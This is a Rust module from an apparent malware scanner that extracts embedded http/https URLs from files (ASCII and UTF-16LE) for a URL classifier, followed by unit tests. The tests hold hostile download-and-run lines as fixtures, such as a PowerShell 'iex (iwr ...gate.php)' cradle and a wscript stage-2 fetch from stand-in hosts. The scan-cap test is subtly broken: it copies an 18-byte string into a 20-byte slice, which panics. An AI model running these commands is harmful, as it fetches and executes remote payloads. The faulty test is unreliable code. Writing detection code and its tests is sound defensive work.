//! Embedded-URL C2 / phishing harvest.
//!
//! Stage-1 droppers, phishing documents and macro stagers no longer carry a
//! payload: they carry a *link*. This module pulls the `http://` / `https://`
//! URLs out of a file's own bytes (ASCII **and** UTF-16LE, so the `.docx`/
//! `.hta`/`.lnk` string tables are covered) and hands them to the URL LightGBM
//! forest, which is the same model the live firewall path scores with.
//!
//! Precision rules — every one of these is an *exclusion*, none of them is a
//! detection rule, and none of them is a host list:
//!
//! * Only `http`/`https` with a syntactically valid host. A bare domain in a
//!   comment, a `mailto:` address or a `file://` dropper path is never scored.
//! * Trailing sentence punctuation and unbalanced brackets are trimmed, so
//!   `see https://host/p.` does not hand the model a `host/p.` token.
//! * Case-insensitive dedup plus hard caps, so a 200 MB installer cannot turn
//!   the layer into a URL dump.
//!
//! There is deliberately **no built-in benign-host list here**. Which hosts are
//! excluded is signature data, not code: the caller runs every harvested URL
//! through `StaticEngine::check_whitelist_blacklist` — the Tranco 1M
//! `.xf` (xorfilter_rules/url_whitelist.xf) plus the compiled CIDR
//! whitelist/blacklist tables — and through the `unwhitelist_subdomains`
//! include-list in `url_threat_rules.yaml`, then applies the 0.90 decision
//! threshold (`EMBEDDED_URL_ML_THRESHOLD`).

/// Bytes inspected per file. Same "the first N MB still carries the header and
/// the string table" reasoning as the YARA (32 MB) and HydraSig (16 MB) caps.
pub const SCAN_CAP: usize = 8 * 1024 * 1024;

/// Hard cap on URLs scored from one file.
pub const MAX_URLS: usize = 256;

/// Longest single URL kept. Anything longer is a truncated string-table
/// fragment rather than a usable URL.
pub const MAX_URL_LEN: usize = 2048;

/// Shortest plausible absolute URL (`http://a.io` is 12 bytes). Below this the
/// "URL" is noise.
pub const MIN_URL_LEN: usize = 12;

/// A URL harvested from a file, with its host pre-computed for the whitelist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EmbeddedUrl {
    /// The URL as it appears in the file (after trimming).
    pub url: String,
    /// Lowercased host, userinfo and IPv6 brackets removed. This is the key the
    /// whitelist is queried with, so `microsoft.com@evil.tld` resolves to
    /// `evil.tld` instead of being waved through.
    pub host: String,
}

/// Bytes that end a URL when found inside a surrounding string. Printable ASCII
/// that legitimately continues a URL is deliberately absent: `-._~%/:@?&=+$,()`
/// and `[]` (IPv6 literals) all stay in.
#[inline]
fn is_url_terminator(b: u8) -> bool {
    b <= 0x20 || matches!(b, b'"' | b'\'' | b'<' | b'>' | b'`' | b'|' | b'\\' | b'{' | b'}' | b'^')
}

/// Scheme match, case-insensitive, at `data[i..]`. Returns the byte length of
/// `http://` or `https://` (0 when there is no match).
#[inline]
fn scheme_len(data: &[u8], i: usize) -> usize {
    const HTTP: &[u8] = b"http://";
    const HTTPS: &[u8] = b"https://";
    let rest = &data[i..];
    let eq = |p: &[u8]| rest.len() >= p.len() && rest[..p.len()].eq_ignore_ascii_case(p);
    if eq(HTTPS) {
        HTTPS.len()
    } else if eq(HTTP) {
        HTTP.len()
    } else {
        0
    }
}

/// Scheme match for UTF-16LE: every character byte is followed by `0x00`.
#[inline]
fn has_wide_scheme(data: &[u8], i: usize) -> bool {
    const HTTP: &[u8] = b"http://";
    const HTTPS: &[u8] = b"https://";
    let eq_wide = |p: &[u8]| {
        i + p.len() * 2 <= data.len()
            && p.iter()
                .enumerate()
                .all(|(k, &c)| data[i + k * 2].eq_ignore_ascii_case(&c) && data[i + k * 2 + 1] == 0)
    };
    eq_wide(HTTPS) || eq_wide(HTTP)
}

/// Host of an absolute `http(s)://` URL, lowercased, with userinfo and IPv6
/// brackets removed. `None` when the URL has no syntactically valid host.
pub fn host_of(url: &str) -> Option<String> {
    let (scheme, rest) = url.split_once("://")?;
    let scheme = scheme.to_ascii_lowercase();
    if scheme != "http" && scheme != "https" {
        return None;
    }

    // Authority ends at the first path / query / fragment delimiter.
    let authority = rest
        .split(|c| c == '/' || c == '?' || c == '#')
        .next()
        .unwrap_or("");
    // `user:pass@host` — only the part after the *last* `@` is the host, so a
    // cloaking URL (`http://paypal.com@evil.tld/`) is keyed on `evil.tld`.
    let authority = match authority.rsplit_once('@') {
        Some((_, h)) => h,
        None => authority,
    };
    // `[::1]:8080` / `host:443`
    let authority = if let Some(inner) = authority.strip_prefix('[') {
        match inner.split_once(']') {
            Some((h, _)) => h,
            None => return None,
        }
    } else {
        match authority.split_once(':') {
            Some((h, port)) if port.bytes().all(|b| b.is_ascii_digit()) => h,
            _ => authority,
        }
    };

    let host = authority.trim().to_ascii_lowercase();
    if valid_host(&host) {
        Some(host)
    } else {
        None
    }
}

/// Syntactic host check: an IP literal, or a dotted name whose last label is at
/// least two ASCII letters. This is what keeps binary data that happens to
/// contain the bytes `http://` from ever reaching the model.
fn valid_host(host: &str) -> bool {
    if host.is_empty() || host.len() > 253 {
        return false;
    }
    if host.parse::<std::net::IpAddr>().is_ok() {
        return true;
    }
    if !host
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'.' || b == b'_')
    {
        return false;
    }
    let labels: Vec<&str> = host.split('.').collect();
    if labels.len() < 2 || labels.iter().any(|l| l.is_empty() || l.len() > 63) {
        return false;
    }
    let tld = labels[labels.len() - 1];
    tld.len() >= 2 && tld.bytes().all(|b| b.is_ascii_alphabetic())
}

/// Trim trailing prose punctuation and unbalanced closing brackets, then build
/// the [`EmbeddedUrl`] if anything usable is left.
fn finalize(raw: &str) -> Option<EmbeddedUrl> {
    let bytes = raw.as_bytes();
    let mut end = raw.len();
    while end > 0 {
        let b = bytes[end - 1];
        let unbalanced = match b {
            b')' => bytes[..end].iter().filter(|&&c| c == b')').count()
                > bytes[..end].iter().filter(|&&c| c == b'(').count(),
            b']' => bytes[..end].iter().filter(|&&c| c == b']').count()
                > bytes[..end].iter().filter(|&&c| c == b'[').count(),
            _ => false,
        };
        // A trailing `)` from prose is unbalanced; one from a real path
        // component (`/a_(b)`) is not. Both cases end up trimmed correctly.
        if unbalanced || matches!(b, b'.' | b',' | b';' | b':' | b'!' | b'?') {
            end -= 1;
            continue;
        }
        break;
    }
    let url = &raw[..end];
    if url.len() < MIN_URL_LEN {
        return None;
    }
    let host = host_of(url)?;
    Some(EmbeddedUrl {
        url: url.to_string(),
        host,
    })
}

/// Accumulates harvested URLs with case-insensitive dedup and the [`MAX_URLS`]
/// cap, so both encodings can share one output list and one seen-set.
#[derive(Default)]
struct Collector {
    urls: Vec<EmbeddedUrl>,
    seen: std::collections::HashSet<String>,
}

impl Collector {
    /// Absorb one raw token. Returns `false` once the cap is reached, which is
    /// the caller's signal to stop scanning.
    fn push(&mut self, raw: &str) -> bool {
        if self.urls.len() >= MAX_URLS {
            return false;
        }
        if let Some(u) = finalize(raw) {
            if self.seen.insert(u.url.to_ascii_lowercase()) {
                self.urls.push(u);
            }
        }
        self.urls.len() < MAX_URLS
    }
}

/// Harvest every usable `http(s)` URL from `data`, capped at [`MAX_URLS`].
///
/// Both encodings are scanned over the same buffer: plain ASCII first, then
/// UTF-16LE.
pub fn extract_urls(data: &[u8]) -> Vec<EmbeddedUrl> {
    let buf = &data[..data.len().min(SCAN_CAP)];
    let mut c = Collector::default();
    if scan_ascii(buf, &mut c) {
        scan_utf16le(buf, &mut c);
    }
    c.urls
}

/// Walk the buffer once, collecting ASCII URLs.
fn scan_ascii(data: &[u8], c: &mut Collector) -> bool {
    let mut i = 0usize;
    while i < data.len() {
        let scheme = scheme_len(data, i);
        if scheme == 0 {
            i += 1;
            continue;
        }
        let start = i;
        let mut end = i + scheme;
        while end < data.len() && end - start < MAX_URL_LEN && !is_url_terminator(data[end]) {
            end += 1;
        }
        if let Ok(raw) = std::str::from_utf8(&data[start..end]) {
            if !c.push(raw) {
                return false;
            }
        }
        // Resume past the token, not past the scheme, so a second scheme
        // embedded in the same run is still found.
        i = end.max(start + 1);
    }
    true
}

/// Walk the buffer once, collecting UTF-16LE URLs — the same `hi == 0` stride
/// check `pe_strings::extract_utf16le` uses for Office string tables.
fn scan_utf16le(data: &[u8], c: &mut Collector) -> bool {
    let mut i = 0usize;
    while i + 1 < data.len() {
        // A URL can only start on a printable ASCII letter followed by 0x00.
        if !data[i].is_ascii_alphabetic() || data[i + 1] != 0 || !has_wide_scheme(data, i) {
            i += 1;
            continue;
        }
        let start = i;
        let mut end = i;
        let mut chars: Vec<u8> = Vec::new();
        // Two bytes per character, so the cap is doubled.
        while end + 1 < data.len() && end - start < MAX_URL_LEN * 2 {
            let lo = data[end];
            if data[end + 1] != 0 || is_url_terminator(lo) {
                break;
            }
            chars.push(lo);
            end += 2;
        }
        if let Ok(raw) = std::str::from_utf8(&chars) {
            if !c.push(raw) {
                return false;
            }
        }
        i = end.max(start + 2);
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    fn urls_of(data: &[u8]) -> Vec<String> {
        extract_urls(data).into_iter().map(|u| u.url).collect()
    }

    fn utf16(s: &str) -> Vec<u8> {
        s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect()
    }

    #[test]
    fn finds_plain_ascii_url() {
        let v = urls_of(b"powershell -c iex (iwr https://a8f7d9a.xyz/gate.php)");
        assert_eq!(v, vec!["https://a8f7d9a.xyz/gate.php".to_string()]);
    }

    #[test]
    fn finds_mixed_case_scheme_and_keeps_original_casing() {
        let v = urls_of(b"HTTP://Evil.Example.IO/A.exe");
        assert_eq!(v, vec!["HTTP://Evil.Example.IO/A.exe".to_string()]);
    }

    #[test]
    fn finds_utf16le_url() {
        let mut data = vec![0u8; 32];
        data.extend_from_slice(&utf16("wscript.exe https://drop.top/stage2.exe "));
        assert_eq!(
            urls_of(&data),
            vec!["https://drop.top/stage2.exe".to_string()]
        );
    }

    #[test]
    fn strips_userinfo_for_the_host_but_keeps_the_url() {
        let u = extract_urls(b"http://paypal.com@evil.tld/verify").remove(0);
        assert_eq!(u.host, "evil.tld");
        assert!(u.url.starts_with("http://paypal.com@evil.tld/"));
    }

    #[test]
    fn harvests_namespace_uris_and_leaves_the_verdict_to_the_whitelist() {
        // The extractor has no host list, so these come back as candidates.
        // `engine::check_whitelist_blacklist` is what has to keep them from
        // turning into findings — Tranco 1M covers all three.
        let data = b"<?xml version=\"1.0\"?><assembly xmlns=\"http://schemas.microsoft.com/net/2005/\">\
                    <xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\"/>\
                    <odf xmlns=\"http://schemas.opendocumentxmlformats.org/officeDocument/2006\"/>";
        let hosts: Vec<String> = extract_urls(data).into_iter().map(|u| u.host).collect();
        assert_eq!(
            hosts,
            vec![
                "schemas.microsoft.com",
                "www.w3.org",
                "schemas.opendocumentxmlformats.org",
            ]
        );
    }

    #[test]
    fn keeps_raw_ip_hosts_for_the_cidr_tables_to_judge() {
        let hosts: Vec<String> = extract_urls(b"http://198.51.100.7:8080/gate.php")
            .into_iter()
            .map(|u| u.host)
            .collect();
        assert_eq!(hosts, vec!["198.51.100.7"]);
    }

    #[test]
    fn trims_prose_punctuation_but_keeps_balanced_brackets() {
        assert_eq!(
            urls_of(b"see https://host.tld/p."),
            vec!["https://host.tld/p".to_string()]
        );
        assert_eq!(
            urls_of(b"(https://host.tld/a_(b))"),
            vec!["https://host.tld/a_(b)".to_string()]
        );
    }

    #[test]
    fn dedups_case_insensitively_and_keeps_first() {
        let v = urls_of(b"https://Host.TLD/A https://host.tld/a https://host.tld/B");
        assert_eq!(
            v,
            vec![
                "https://Host.TLD/A".to_string(),
                "https://host.tld/B".to_string()
            ]
        );
    }

    #[test]
    fn rejects_anything_without_a_valid_http_host() {
        for s in [
            "http://",
            "http:///path",
            "http://localhost",
            "https://notatld/payload",
            "https://a.1/payload",
            "mailto:drop@example.tld",
            "ftp://host.tld/f",
            "file:///c:/windows/system32/cmd.exe",
        ] {
            assert!(extract_urls(s.as_bytes()).is_empty(), "{s} must be skipped");
        }
    }

    #[test]
    fn caps_the_number_of_urls() {
        let mut data = Vec::new();
        for i in 0..(MAX_URLS + 50) {
            data.extend_from_slice(format!("https://h{i}.tld/a ").as_bytes());
        }
        assert_eq!(extract_urls(&data).len(), MAX_URLS);
    }

    #[test]
    fn honours_the_scan_cap() {
        let mut data = vec![b' '; SCAN_CAP + 4096];
        let at = SCAN_CAP + 16;
        data[at..at + 20].copy_from_slice(b"https://late.tld/a");
        assert!(extract_urls(&data).is_empty());
    }

    #[test]
    fn host_of_handles_ipv6_ports_and_brackets() {
        assert_eq!(
            host_of("http://[2001:db8::1]:8080/x").as_deref(),
            Some("2001:db8::1")
        );
        assert_eq!(host_of("https://host.tld:8443").as_deref(), Some("host.tld"));
        assert_eq!(host_of("http://host.tld").as_deref(), Some("host.tld"));
    }
}